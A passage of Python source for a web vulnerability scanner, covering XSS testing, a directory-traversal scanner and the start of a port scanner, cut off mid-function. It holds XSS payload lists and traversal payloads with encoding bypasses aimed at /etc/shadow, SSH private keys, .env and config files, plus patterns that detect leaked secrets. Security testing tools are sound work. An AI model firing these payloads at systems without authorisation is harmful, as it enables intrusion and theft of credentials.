        # Look for our payload being passed to dangerous DOM manipulation functions
        for script in soup.find_all('script'):
            script_content = script.text.lower()
            dangerous_dom_funcs = [
                'document.write', 'innerHTML', 'outerHTML', 'insertAdjacentHTML',
                'eval(', 'setTimeout(', 'setInterval(', 'new Function(', 
                'document.createElement', 'document.location', 'location.href'
            ]
            
            # Check for both dangerous functions and any part of our payload
            # Finding both suggests potential DOM XSS
            if any(func in script_content for func in dangerous_dom_funcs):
                # Extract the payload core elements (alert, XSS mentions)
                if 'alert' in payload and 'alert' in script_content:
                    for func in dangerous_dom_funcs:
                        # Check for patterns like: dangerous_func(...payload...)
                        pattern = f"{func}.*alert.*xss"
                        if re.search(pattern, script_content, re.IGNORECASE):
                            return True
        
        # Advanced attribute context detection - checking for real-world injection points
        if '="' in payload or "='" in payload or '>' in payload or '<' in payload or '"' in payload or "'" in payload:
            # This could be a quotation mark escape or tag closing attempt
            for tag in soup.find_all():
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and payload in value:
                        # Check if we're in a JavaScript event handler attribute (highest risk)
                        if attr.lower().startswith('on'):
                            return True
                        
                        # Check for style attribute with JavaScript execution vectors
                        if attr.lower() == 'style' and ('expression' in value.lower() or 'url(' in value.lower()):
                            return True
                            
                        # Check for src/href attributes with javascript: protocol
                        if attr.lower() in ['src', 'href', 'formaction', 'action'] and 'javascript:' in value.lower():
                            return True
                        
                        # Check if we've broken out of the attribute with quotes
                        if '"' in payload or "'" in payload:
                            # Look for patterns where our quotes have escaped the attribute
                            # More comprehensive pattern matching for various context breaks
                            patterns = [
                                f'[^=]"{payload}|{payload}"[^>]',  # Basic quote break
                                f'[^=]\'{payload}|{payload}\'[^>]',  # Single quote break
                                f'{payload}"><',  # Quote and angle bracket to start a new tag
                                f'{payload}\'><',  # Single quote and angle bracket
                                f'"{payload}"',    # Clean injection inside double quotes
                                f'\'{payload}\''   # Clean injection inside single quotes
                            ]
                            
                            for pattern in patterns:
                                if re.search(pattern, response_text, re.IGNORECASE):
                                    return True
                        
                        # Check for HTML encoded attribute breaks (hex/decimal encoding)
                        encoded_patterns = [
                            r'&#34;' + payload,  # Decimal HTML entity for quote
                            r'&#39;' + payload,  # Decimal HTML entity for apostrophe
                            r'&#x22;' + payload, # Hex HTML entity for quote
                            r'&#x27;' + payload  # Hex HTML entity for apostrophe
                        ]
                        
                        for pattern in encoded_patterns:
                            if pattern in response_text:
                                return True
        
        # Advanced detection for filtered/encoded payloads
        if "alert" in payload and "XSS" in payload:
            if "alert" in response_text and "XSS" in response_text:
                # If alert and XSS appear anywhere, we need to check the context carefully
                for tag in soup.find_all(string=re.compile(r'alert.*XSS', re.IGNORECASE)):
                    parent = tag.parent.name
                    # Check if it's not just displayed as text in a safe context
                    if parent not in ['pre', 'code', 'textarea']:
                        # Check if it's in a different node than just text
                        if parent in ['script', 'style'] or (hasattr(tag.parent, 'attrs') and 
                                                            any(a.startswith('on') for a in tag.parent.attrs)):
                            return True
        
        return False
    
    def _check_reflective_xss(self, url, param_name, form_details=None, method="get"):
        """
        Test for reflective XSS by first checking if input is reflected without alteration.
        
        Args:
            url (str): The URL to test
            param_name (str): The parameter name to test
            form_details (dict, optional): Form details if testing a form
            method (str): HTTP method - "get" or "post"
            
        Returns:
            tuple: (is_reflected, reflection_context)
        """
        for reflection_string in self.reflection_strings:
            try:
                if form_details:
                    # Testing a form input
                    data = {}
                    for input_field in form_details["inputs"]:
                        if input_field["name"] == param_name:
                            data[input_field["name"]] = reflection_string
                        else:
                            data[input_field["name"]] = input_field["value"]
                    
                    if method == "post":
                        response = requests.post(
                            form_details["action"],
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # method == "get"
                        response = requests.get(
                            form_details["action"],
                            params=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                
                else:
                    # Testing a URL parameter
                    parsed_url = urlparse(url)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    # Create test URL with reflection string
                    params = {param_name: reflection_string}
                    
                    # Add other parameters back if needed
                    if parsed_url.query:
                        original_params = parse_qs(parsed_url.query)
                        for p_name, p_values in original_params.items():
                            if p_name != param_name:
                                params[p_name] = p_values[0]
                    
                    response = requests.get(
                        base_url,
                        params=params,
                        headers=self.headers,
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                
                if reflection_string in response.text:
                    # Determine reflection context (HTML, attribute, JavaScript, etc.)
                    context = self._determine_reflection_context(response.text, reflection_string)
                    return True, context
            
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error testing reflective XSS: {str(e)}")
                continue
        
        return False, None
    
    def _determine_reflection_context(self, html, reflection_string):
        """
        Determine the context in which the reflection string appears.
        
        Args:
            html (str): The HTML content
            reflection_string (str): The string to find
            
        Returns:
            str: Context type ("html", "attribute", "js", "url", "css")
        """
        try:
            if f"<script>var example = '{reflection_string}'</script>" in html:
                return "js"
            
            if f'<a href="{reflection_string}">' in html:
                return "url"
            
            if f'style="{reflection_string}"' in html:
                return "css"
            
            # Use BeautifulSoup for more accurate context detection
            soup = BeautifulSoup(html, 'html.parser')
            
            # Check if it's in an HTML attribute
            for tag in soup.find_all(lambda t: any(reflection_string in str(attr) for attr in t.attrs.values())):
                for attr_name, attr_value in tag.attrs.items():
                    if reflection_string in str(attr_value):
                        return f"attribute:{attr_name}"
            
            # Check if it's in JavaScript
            for script in soup.find_all('script'):
                if script.string and reflection_string in script.string:
                    return "js"
            
            # Check for inline event handlers
            for tag in soup.find_all(lambda t: any(attr.startswith('on') and reflection_string in str(val) 
                                             for attr, val in t.attrs.items())):
                for attr_name, attr_value in tag.attrs.items():
                    if attr_name.startswith('on') and reflection_string in str(attr_value):
                        return f"event_handler:{attr_name}"
            
            # Default to HTML context
            return "html"
        
        except Exception:
            # If parsing fails, default to unknown
            return "unknown"
    
    def _get_context_specific_payloads(self, context):
        """
        Get context-specific XSS payloads based on reflection context.
        
        Args:
            context (str): The reflection context
            
        Returns:
            list: List of payloads optimized for the context
        """
        if context == "js":
            return [
                "';alert('XSS');//",
                "\\';alert('XSS');//",
                "\\\\';alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "\";alert('XSS');//"
            ]
        
        elif context.startswith("attribute:"):
            attr_name = context.split(':')[1]
            
            if attr_name in ['src', 'href', 'action']:
                return [
                    "javascript:alert('XSS')",
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
                ]
            
            return [
                "\" onmouseover=\"alert('XSS')\"",
                "\" onload=\"alert('XSS')\"",
                "\" onerror=\"alert('XSS')\"",
                "\" onclick=\"alert('XSS')\"",
                "\"><script>alert('XSS')</script>",
                "\"><img src=x onerror=\"alert('XSS')\">"
            ]
        
        elif context.startswith("event_handler:"):
            return [
                "alert('XSS')",
                "alert`XSS`",
                "eval('alert(\\'XSS\\')')",
                "(function(){alert('XSS')})()"
            ]
        
        elif context == "url":
            return [
                "javascript:alert('XSS')",
                "javascript:eval('alert(\\'XSS\\')')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
            ]
        
        elif context == "css":
            return [
                "expression(alert('XSS'))",
                "';alert('XSS');//",
                "\\';alert('XSS');//",
                "</style><script>alert('XSS')</script>"
            ]
        
        else:  # Default to general HTML context
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe onload=alert('XSS')></iframe>",
                "<div onmouseover=alert('XSS')>XSS</div>"
            ]
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for XSS vulnerabilities.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        for param_name, param_values in parameters.items():
            # First check if parameter is reflected
            is_reflected, context = self._check_reflective_xss(url, param_name)
            
            if is_reflected:
                if self.verbose and self.logger:
                    self.logger.info(f"Parameter '{param_name}' is reflected in context: {context}")
                
                # Get context-specific payloads if reflection is detected
                payloads_to_test = self._get_context_specific_payloads(context) + self.payloads
            else:
                # If no reflection detected, still test with general payloads but fewer
                payloads_to_test = self.payloads[:5]  # Test only first few payloads to save time
            
            # Test XSS payloads
            for payload in payloads_to_test:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing XSS payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check if XSS was successful
                    if self._is_xss_successful(response.text, payload):
                        detail = f"Parameter '{param_name}' is vulnerable to Cross-Site Scripting (XSS) using payload: {payload}"
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'context': context if is_reflected else "unknown",
                            'severity': 'High',
                            'recommendation': "Implement proper output encoding and context-aware validation"
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"XSS found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}' for XSS: {str(e)}")
        
        return vulnerabilities
    
    def _scan_form(self, form_details, url):
        """
        Test a form for XSS vulnerabilities.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        action = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on {url} with action {action} using method {method}")
        
        for input_field in inputs:
            # Skip non-text inputs like submit buttons, checkboxes, etc.
            if input_field["type"] not in ["text", "search", "email", "url", "password", "textarea"]:
                continue
                
            input_name = input_field["name"]
            
            # First check if input is reflected
            is_reflected, context = self._check_reflective_xss(
                url, 
                input_name, 
                form_details=form_details, 
                method=method
            )
            
            if is_reflected:
                if self.verbose and self.logger:
                    self.logger.info(f"Form input '{input_name}' is reflected in context: {context}")
                
                # Get context-specific payloads if reflection is detected
                payloads_to_test = self._get_context_specific_payloads(context) + self.payloads
            else:
                # If no reflection detected, still test with general payloads but fewer
                payloads_to_test = self.payloads[:5]  # Test only first few payloads to save time
            
            # Test XSS payloads
            for payload in payloads_to_test:
                # Clone the inputs dictionary
                data = {}
                for inp in inputs:
                    # Use the original value for all fields except the one being tested
                    if inp["name"] != input_name:
                        data[inp["name"]] = inp["value"]
                    else:
                        data[inp["name"]] = payload
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing XSS payload on form input '{input_name}': {payload}")
                    
                    if method == "post":
                        response = requests.post(
                            action, 
                            data=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # method == "get"
                        response = requests.get(
                            action, 
                            params=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check if XSS was successful
                    if self._is_xss_successful(response.text, payload):
                        detail = f"Form input '{input_name}' is vulnerable to Cross-Site Scripting (XSS) using payload: {payload}"
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': url,
                            'method': method.upper(),
                            'parameter': input_name,
                            'payload': payload,
                            'details': detail,
                            'context': context if is_reflected else "unknown",
                            'severity': 'High',
                            'recommendation': "Implement proper output encoding and context-aware validation"
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"XSS found: {detail}")
                        
                        # No need to test more payloads for this input
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form input '{input_name}' for XSS: {str(e)}")
        
        return vulnerabilities
    
    def scan(self):
        """
        Start the Cross-Site Scripting (XSS) vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting XSS scan on {self.target_url}")
        
        try:
            # Scan GET parameters in the base URL
            get_vulnerabilities = self._scan_get_parameters(self.target_url)
            vulnerabilities.extend(get_vulnerabilities)
            
            # Extract and scan forms
            forms = self._extract_forms(self.target_url)
            for form in forms:
                form_vulnerabilities = self._scan_form(form, self.target_url)
                vulnerabilities.extend(form_vulnerabilities)
            
            # Additional crawling for more complex scanning if required by depth
            if self.depth > 1:
                # Extract links from the target page up to the depth level
                try:
                    response = requests.get(self.target_url, headers=self.headers, timeout=self.timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links on the page
                    links = []
                    for a_tag in soup.find_all('a', href=True):
                        link = urljoin(self.target_url, a_tag['href'])
                        # Only include links on the same domain
                        target_domain = urlparse(self.target_url).netloc
                        link_domain = urlparse(link).netloc
                        
                        if link_domain == target_domain and link not in links:
                            links.append(link)
                    
                    # Limit the number of links to scan based on depth
                    max_links = min(len(links), 5 * self.depth)  # e.g., depth 2 = 10 links
                    links = links[:max_links]
                    
                    if self.verbose and self.logger:
                        self.logger.info(f"Found {len(links)} links, scanning {max_links}")
                    
                    # Scan each link
                    for link in links:
                        if self.verbose and self.logger:
                            self.logger.info(f"Scanning link: {link}")
                        
                        # Scan GET parameters
                        get_vulnerabilities = self._scan_get_parameters(link)
                        vulnerabilities.extend(get_vulnerabilities)
                        
                        # Scan forms
                        forms = self._extract_forms(link)
                        for form in forms:
                            form_vulnerabilities = self._scan_form(form, link)
                            vulnerabilities.extend(form_vulnerabilities)
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error during link crawling: {str(e)}")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during XSS scan: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Completed XSS scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# DIRECTORY TRAVERSAL SCANNER
###########################################

class DirectoryTraversalScanner:
    """Scanner for detecting Directory Traversal vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Directory Traversal scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Directory traversal payloads
        self.payloads = [
            # Basic traversal patterns
            "../", 
            "../../", 
            "../../../", 
            "../../../../", 
            "../../../../../",
            
            # OS-specific files to check for (multiple OS targets)
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            
            # Windows targets
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            
            # Encoding bypasses
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Nested traversal
            ".../.../.../etc/passwd",
            "....//....//....//etc/passwd",
            
            # Null byte injection (for older applications)
            "../../../etc/passwd%00",
            "../../../../etc/passwd%00",
            "../../../../../etc/passwd%00",
            
            # Double URL encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            
            # Path normalization evasion
            ".//..//..//..//etc/passwd",
            "../..///..//..//etc/passwd",
            
            # Backlash characters for Windows-based servers
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "..%255c..%255c..%255cwindows%255cwin.ini",
            
            # Unicode bypass techniques
            # Unicode full-width characters
            "%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd",
            
            # Unicode normalization bypasses (exotic)
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            # Overlong UTF-8 encoding
            "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
            
            # Mixed encoding hybrid attacks
            "..%25%35%63..%25%35%63..%25%35%63windows%25%35%63win.ini",
            
            # Web server specific bypasses
            # Apache/IIS specific tricks
            ";/../../../../etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            
            # Specific to older PHP versions
            "....//....//....//....//etc/passwd",
            
            # Non-recursive path traversal
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            
            # Advanced paths for important files
            "../../../etc/shadow",
            "../../../../etc/shadow",
            "../../../../../var/www/html/index.php",
            "../../../../var/www/html/index.php",
            "../../../../../var/www/html/config.php",
            "../../../../var/www/html/config.php",
            "../../../../proc/self/environ",
            "../../../../../proc/self/environ",
            
            # Configuration files for servers
            "../../../apache/conf/httpd.conf",
            "../../../../apache/conf/httpd.conf",
            "../../../xampp/apache/conf/httpd.conf",
            "../../../../xampp/apache/conf/httpd.conf",
            
            # ASP/IIS files
            "../../../inetpub/wwwroot/web.config",
            "../../../../inetpub/wwwroot/web.config"
        ]
        
        # Signs that a traversal was successful - file contents
        self.success_patterns = [
            # Unix system files
            r"root:.*:0:0:",  # /etc/passwd
            r"BEGIN.*PRIVATE KEY",  # Private key
            r"auth.*required",  # PAM configuration
            r"#.*XAMPP.*#",  # XAMPP files
            
            # Web configuration files
            r"<VirtualHost",  # Apache config
            r"ServerName",  # Apache config
            r"RewriteEngine",  # htaccess
            r"<configuration>",  # .NET config
            r"<connectionStrings>",  # .NET config
            r"<system.webServer>",  # IIS config
            
            # Windows patterns
            r"for 16-bit app support",  # Windows win.ini
            r"MAPI=1;",  # Windows win.ini
            r"\[boot loader\]",  # Boot.ini
            
            # Database files
            r"INSERT INTO",
            r"CREATE TABLE",
            r"sqlite_master",
            
            # Other config files
            r"DB_CONNECTION|DB_HOST|DB_PASSWORD",  # .env files
            r"JDBC.*Connection",  # Java files
            r"jdbc:mysql:",  # Java DB configurations
            r"spring.datasource",  # Spring applications
            
            # Application source code
            r"<\?php",
            r"namespace",
            r"import.*React",
            r"import.*Vue",
            r"function.*\(.*\)"
        ]
        
        # File paths to look for
        self.interesting_files = [
            # Configuration files
            "config.php", 
            ".env", 
            "wp-config.php", 
            "web.config", 
            "config.json",
            ".htaccess",
            "settings.php",
            
            # Common backup files  
            "backup.sql", 
            "db_backup.sql", 
            "database.sql", 
            "app.backup", 
            "config.bak",
            "config.php.bak",
            ".env.bak",
            
            # Source code backup files often exposed
            "index.php~", 
            "index.php.bak", 
            "index.php.old", 
            ".git/HEAD",
            
            # Temp files
            "config.php.swp", 
            ".config.php.swp",
            "config.php.save",
            
            # Log files
            "access.log",
            "error.log",
            "debug.log",
            "php_error.log",
            
            # User files
            ".bash_history",
            ".ssh/id_rsa",
            ".ssh/authorized_keys"
        ]
        
        # Compile the success patterns for faster matching
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.success_patterns]
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _construct_traversal_urls(self):
        """
        Construct URLs with directory traversal payloads.
        
        Returns:
            list: List of payload URLs to test
        """
        parsed_url = urlparse(self.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Extract path segments
        path_segments = parsed_url.path.strip('/').split('/')
        
        # Find potential inject points in URL path
        test_urls = []
        
        # Case 1: Direct path manipulation - replace portions of the path with traversal
        if len(path_segments) > 0:
            for i in range(len(path_segments)):
                path_prefix = '/'.join(path_segments[:i])
                
                for payload in self.payloads:
                    # Handle different traversal scenarios
                    if i > 0:
                        test_url = f"{base_url}/{path_prefix}/{payload}"
                    else:
                        test_url = f"{base_url}/{payload}"
                    
                    test_urls.append(test_url)
        
        # Case 2: Check for 'path', 'file', 'page', 'dir', etc. parameters that might accept file paths
        params = self._extract_parameters(self.target_url)
        if params:
            for param_name in params:
                # Check if parameter is likely to be a file path parameter
                path_param_indicators = ['path', 'file', 'page', 'dir', 'folder', 'doc', 'document', 'img', 'image']
                
                # Check if this parameter might be a file path parameter
                is_path_param = any(indicator in param_name.lower() for indicator in path_param_indicators)
                
                # Test all parameters, but prioritize likely path parameters
                if is_path_param or self.depth > 1:
                    param_value = params[param_name][0]  # Get the first value for this parameter
                    
                    for payload in self.payloads:
                        # Create a modified URL with the payload injected into this parameter
                        # First, create a copy of the parameters
                        new_params = {k: v[0] for k, v in params.items()}
                        
                        # Replace the parameter value with the payload
                        new_params[param_name] = payload
                        
                        # Generate the query string
                        query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                        
                        # Build the final URL
                        test_url = f"{base_url}{parsed_url.path}?{query_string}"
                        test_urls.append(test_url)
                        
                        # Also try combining with existing value if depth allows for more aggressive testing
                        if self.depth > 1:
                            # Insert payload at the start of the value (common for relative paths)
                            new_params[param_name] = f"{payload}{param_value}"
                            query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                            test_url = f"{base_url}{parsed_url.path}?{query_string}"
                            test_urls.append(test_url)
                            
                            # Append payload to the end of the value (useful for some endpoints)
                            new_params[param_name] = f"{param_value}/{payload}"
                            query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                            test_url = f"{base_url}{parsed_url.path}?{query_string}"
                            test_urls.append(test_url)
        
        # Case 3: Test additional interesting files (if depth allows)
        if self.depth > 1:
            for file_path in self.interesting_files:
                for traversal in ["../", "../../", "../../../", "../../../../", "../../../../../"]:
                    # Construct payloads targeting specific files
                    full_payload = f"{traversal}{file_path}"
                    
                    # Test in both path and parameters
                    # Path test
                    test_url = f"{base_url}/{full_payload}"
                    test_urls.append(test_url)
                    
                    # Parameter tests (limit to likely path parameters)
                    if params:
                        for param_name in params:
                            path_param_indicators = ['path', 'file', 'page', 'dir', 'folder', 'doc', 'document', 'img', 'image']
                            is_path_param = any(indicator in param_name.lower() for indicator in path_param_indicators)
                            
                            if is_path_param:
                                # Create a modified URL with the payload injected into this parameter
                                new_params = {k: v[0] for k, v in params.items()}
                                new_params[param_name] = full_payload
                                query_string = '&'.join([f"{k}={v}" for k, v in new_params.items()])
                                test_url = f"{base_url}{parsed_url.path}?{query_string}"
                                test_urls.append(test_url)
        
        # Remove duplicates
        test_urls = list(set(test_urls))
        
        if self.verbose and self.logger:
            self.logger.info(f"Generated {len(test_urls)} traversal payloads to test")
        
        return test_urls
    
    def _is_traversal_successful(self, response_content, response_status=None, response_headers=None):
        """
        Check if the directory traversal attempt was successful using multiple detection techniques.
        Uses aggressive pattern matching and content analysis for real exploitation confirmation.
        
        Args:
            response_content (str): The response content to check
            response_status (int, optional): The HTTP status code of the response
            response_headers (dict, optional): The HTTP headers of the response
            
        Returns:
            bool: True if directory traversal was successful, False otherwise
        """
        # Check for file content patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        
        # Content-specific checks - passwd file
        if "root:" in response_content and ":/root:" in response_content:
            return True
        
        # Windows file patterns
        if "for 16-bit app support" in response_content and "MAPI=" in response_content:
            return True
        
        # Config file patterns
        if "<?php" in response_content and ("define(" in response_content or "$config" in response_content):
            return True
        
        # Check for Apache config
        if "<Directory " in response_content and "AllowOverride" in response_content:
            return True
        
        # Check environment variable files
        if "DB_PASSWORD" in response_content or "API_KEY" in response_content:
            return True
        
        # Binary file detection via content type
        if response_headers and 'Content-Type' in response_headers:
            binary_types = ['application/octet-stream', 'application/x-executable', 'application/x-shockwave-flash']
            if any(btype in response_headers['Content-Type'] for btype in binary_types):
                # This might be a binary file accessed via traversal
                return True
        
        # Look for suspicious error messages that might indicate traversal
        # but with access denied (still a vulnerability, just not exploitable directly)
        if self._check_error_responses(response_content, response_status):
            return True
        
        return False
    
    def _check_error_responses(self, response_content, response_status=None):
        """
        Check if response contains error messages that might indicate a vulnerability.
        Uses more aggressive pattern matching for real-world directory traversal indicators.
        
        Args:
            response_content (str): The response content to check
            response_status (int, optional): The HTTP status code of the response
            
        Returns:
            bool: True if error messages were found, False otherwise
        """
        # Permission denied errors (still indicate traversal worked but access was denied)
        permission_errors = [
            "Permission denied",
            "Access is denied",
            "Not enough permissions",
            "Error 403",
            "you don't have permission",
            "CSRF verification failed",
            "CSRF token validation failed"
        ]
        
        # Path-related errors
        path_errors = [
            "No such file or directory",
            "Failed to open stream",
            "cannot access",
            "cannot find the file specified",
            "No such file",
            "file not found but the directory exists",
            "fopen(",
            "include()",
            "Warning: include",
            "Warning: require",
            "readfile("
        ]
        
        # Check for the presence of these error messages
        for error in permission_errors + path_errors:
            if error.lower() in response_content.lower():
                # For permission errors, only consider it a find if response_status is also 403 or 401
                if error in permission_errors:
                    if response_status and (response_status == 403 or response_status == 401):
                        return True
                else:
                    return True
        
        # Look for full path disclosures
        path_disclosure_patterns = [
            r"[A-Z]:\\[\\\w\-\.]+\.php",  # Windows paths
            r"/var/www/[\w\-\.\/]+\.php",  # Linux paths
            r"/home/[\w\-\.\/]+/public_html",  # Linux hosting paths
            r"/usr/local/[\w\-\.\/]+",  # More Linux paths
            r"/opt/[\w\-\.\/]+",  # More Linux paths
            r"/srv/[\w\-\.\/]+"  # More Linux paths
        ]
        
        for pattern in path_disclosure_patterns:
            if re.search(pattern, response_content):
                return True
        
        return False
    
    def scan(self):
        """
        Start the directory traversal vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting directory traversal scan on {self.target_url}")
        
        # Generate traversal payloads
        test_urls = self._construct_traversal_urls()
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing {len(test_urls)} different traversal payloads")
        
        # Test each URL for directory traversal
        for test_url in test_urls:
            try:
                if self.verbose and self.logger:
                    self.logger.info(f"Testing: {test_url}")
                
                response = requests.get(
                    test_url,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=False  # Avoid following redirects to better detect issues
                )
                
                # Check if traversal attempt was successful
                if self._is_traversal_successful(response.text, response.status_code, response.headers):
                    # Get the payload from the URL
                    payload = test_url.split('/')[-1] if '/' in test_url else test_url
                    
                    # Extract parameter name if it's a parameter-based injection
                    param_name = None
                    if '?' in test_url:
                        query_part = test_url.split('?')[1]
                        for param in query_part.split('&'):
                            if any(payload in param for payload in self.payloads):
                                param_name = param.split('=')[0]
                                break
                    
                    detail = f"Directory traversal vulnerability found using: {payload}"
                    if param_name:
                        detail = f"Directory traversal vulnerability found in parameter '{param_name}' using: {payload}"
                    
                    vulnerability = {
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'payload': payload,
                        'parameter': param_name,
                        'details': detail,
                        'status_code': response.status_code,
                        'content_length': len(response.text),
                        'severity': 'High',
                        'recommendation': "Validate file paths, use whitelisting, and avoid user-controlled filesystem operations"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Directory traversal found: {detail}")
                    
                    # We've found a vulnerability, no need to test every remaining payload
                    # Just test a different type of payload
                    break
            
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error testing URL {test_url}: {str(e)}")
                continue
        
        if self.logger:
            self.logger.info(f"Completed directory traversal scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# PORT SCANNER
###########################################

class PortScanner:
    """Scanner for detecting open ports on a target host."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Port scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Socket connection timeout in seconds
            depth (int): Number of ports to scan (1=common, 2=extended, 3=full)
            user_agent (str): Not used for port scanning but required for consistency
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.logger = logger
        self.verbose = verbose
        
        # Extract hostname from URL
        parsed_url = urlparse(target_url)
        self.target_host = parsed_url.netloc.split(':')[0]  # Remove port from hostname if present
        
        # Common service names for well-known ports
        self.service_names = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            111: 'RPC',
            135: 'RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1433: 'MSSQL',
            1521: 'Oracle',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            5901: 'VNC-1',
            5902: 'VNC-2',
            6379: 'Redis',
            8080: 'HTTP-Proxy',
            8443: 'HTTPS-Alt',
            9200: 'Elasticsearch',
            27017: 'MongoDB'
        }
    
    def _scan_port(self, port):
        """
        Check if a specific port is open on the target host.
        
        Args:
            port (int): The port number to scan
            
        Returns:
            tuple: (port, is_open, service_name) or None if error
        """
        try:
            # Create a socket
